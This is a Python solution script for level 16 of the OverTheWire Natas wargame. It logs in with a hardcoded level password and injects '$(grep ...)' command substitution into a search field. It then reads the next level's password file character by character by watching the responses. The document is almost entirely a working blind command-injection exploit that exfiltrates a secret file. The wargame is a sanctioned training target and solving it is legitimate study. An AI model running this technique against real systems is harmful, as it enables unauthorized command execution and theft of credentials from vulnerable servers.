import string

import requests
from requests.auth import HTTPBasicAuth

USERNAME = 'natas16'
NATAS16_PASSWORD = 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'
URL = f'http://{USERNAME}.natas.labs.overthewire.org/'
AUTH = HTTPBasicAuth(USERNAME, NATAS16_PASSWORD)

ASCII_CHARS = string.ascii_letters + string.digits

SESSION = requests.Session()

FILE_PATH = 'password_chars.txt'


def obtain_password_chars(FILE_PATH):
    password = ''
    for char in ASCII_CHARS:
        payload = f"doomed$(grep {char} /etc/natas_webpass/natas17)"
        data = {'needle': payload}
        r = SESSION.post(URL, auth=AUTH, data=data)

        print(char, end=', ')
        if 'doomed' not in r.text:
            password += char
            print('password chars: ', password)
        else:
            print(char, ' not in password')

    with open(FILE_PATH, 'w') as file:
        file.write(password)

obtain_password_chars(FILE_PATH)

def get_password():
    password = ''

    with open(FILE_PATH, 'r') as file:
        password_chars = file.read()

    while len(password) < 32:
        for char in password_chars:
            payload = f"doomed$(grep ^{password + char} /etc/natas_webpass/natas17)"
            data = {'needle': payload}

            r = SESSION.post(URL, auth=AUTH, data=data)

            print(char, end=', ')
            if 'doomed' not in r.text:
                password += char
                print('password is... ', password)
                break

    return password


print(get_password())

SESSION.close()
